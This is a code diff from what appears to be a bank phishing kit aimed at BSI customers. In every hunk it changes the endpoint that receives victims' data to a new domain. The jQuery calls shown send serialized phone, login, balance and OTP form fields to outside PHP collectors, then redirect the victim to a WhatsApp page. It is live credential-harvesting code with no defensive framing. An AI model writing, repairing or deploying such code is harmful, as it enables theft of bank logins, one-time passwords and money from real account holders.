@@ -12,7 +12,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://anjayhostjon.cloud/BSI/b4h6a/no.php',
+            url: 'https://demcloud.my.id/BSI/b4h6a/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -32,7 +32,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://anjayhostjon.cloud/BSI/b4h6a/login.php',
+            url: 'https://demcloud.my.id/BSI/b4h6a/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -60,7 +60,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://anjayhostjon.cloud/BSI/b4h6a/saldo.php',
+            url: 'https://demcloud.my.id/BSI/b4h6a/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -92,7 +92,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://anjayhostjon.cloud/BSI/b4h6a/otp.php',
+ url: 'https://demcloud.my.id/BSI/b4h6a/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -127,7 +127,7 @@ function getcs(){
  $("#djload").show();   
   
 setTimeout(function(){  
-location.href='https://anjayhostjon.cloud/BSI/b4h6a/wa';
+location.href='https://demcloud.my.id/BSI/b4h6a/wa';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
